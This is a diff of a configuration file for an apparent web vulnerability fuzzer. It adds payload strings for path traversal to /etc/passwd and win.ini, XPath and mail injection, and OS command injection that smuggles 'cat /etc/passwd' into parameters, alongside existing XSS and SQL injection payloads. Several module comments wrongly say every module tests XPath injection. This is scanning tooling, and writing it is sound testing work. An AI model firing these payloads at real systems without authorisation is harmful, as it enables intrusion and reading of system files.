@@ -1,6 +1,7 @@
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <punkfuzz_config>
   <modules>
+
     <xss_config>
     <!--This module searches in <script> tags for alert(__RANDOM_INT__) where __RANDOM_INT__ is
     a random integer assigned at runtime. If you'd like to add payloads, make sure you use this
@@ -11,6 +12,7 @@
       <xss_string><![CDATA[<ScR<script>iPt>alert(__RANDOM_INT__)</SCr<script>IpT>]]></xss_string>
       </xss_strings>
     </xss_config>
+
     <sqli_config>
     <!--This module simply searches the response for SQL errors. Feel free to add any payloads you'd like.-->
       <sqli_strings>
@@ -19,6 +21,7 @@
       <sqli_string><![CDATA[--;'#]]></sqli_string>
       </sqli_strings>
     </sqli_config>
+
     <bsqli_config>
     <!--This module tests for blind sql injection by attempting to inject true
     SQL statements into parameters then untrue and testing the content length of each. We recommend
@@ -30,7 +33,55 @@
       <bsqli_string><![CDATA[__VALID_PARAM__ AND 1=1--]]></bsqli_string>
       </bsqli_strings>
     </bsqli_config>
+
+    <trav_config>
+    <!--This module tests for XPath injection by attempting to inject XPath and looking for specific errors-->
+      <trav_strings>
+      <trav_string><![CDATA[../../../../../../../../../../../../../../../../../../../../../../etc/passwd]]></trav_string>
+      <trav_string><![CDATA[..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini]]></trav_string>
+      <trav_string><![CDATA[../../../../../../../../../../../../../../../../../../../../../../windows/win.ini]]></trav_string>
+      </trav_strings>
+    </trav_config>
+
+    <mxi_config>
+    <!--This module tests for XPath injection by attempting to inject XPath and looking for specific errors-->
+      <mxi_strings>
+      <!--<mxi_string><![CDATA[]]></mxi_string>-->
+      <mxi_string><![CDATA[__VALID_PARAM__@#!\'"]]></mxi_string>
+      <mxi_string><![CDATA[__VALID_PARAM__aiowjefij]]></mxi_string>
+      </mxi_strings>
+    </mxi_config>
+
+    <xpathi_config>
+    <!--This module tests for XPath injection by attempting to inject XPath and looking for specific errors-->
+      <xpathi_strings>
+      <xpathi_string><![CDATA[__VALID_PARAM__d'z"0]]></xpathi_string>
+      <xpathi_string><![CDATA[__VALID_PARAM__<!--]]></xpathi_string>
+      </xpathi_strings>
+    </xpathi_config>
+    
+    <osci_config>
+    <!--This module tests for XPath injection by attempting to inject XPath and looking for specific errors-->
+      <osci_strings>
+      <osci_string><![CDATA[__VALID_PARAM__ | cat /etc/passwd |]]></osci_string>
+      <osci_string><![CDATA[__VALID_PARAM__ & type %SYSTEMROOT%\\win.ini &]]></osci_string>
+      <osci_string><![CDATA[__VALID_PARAM__ && cat /etc/passwd && ]]></osci_string>
+
+	  <!--Line breaks in data below are deliberate-->
+      <osci_string><![CDATA[__VALID_PARAM__
+      cat /etc/passwd
+      ]]></osci_string>
+
+      <!--Line breaks in data below are deliberate-->      
+      <osci_string><![CDATA[__VALID_PARAM__
+      type %SYSTEMROOT%\\win.ini
+      ]]></osci_string>
+      
+      </osci_strings>
+    </osci_config>
+    
   </modules>
+  
   <network_configs>
     <proxy type="http">
       <ip_port><![CDATA[]]></ip_port>
@@ -40,6 +91,7 @@
       <summary_url><![CDATA[http://<your Solr summary ip>:8983/solr]]></summary_url>
     </solr>
   </network_configs>
+
   <fuzz_configs>
     <contentl_check_wfallback>yes</contentl_check_wfallback>
     <pagesize_limit>5242880</pagesize_limit>
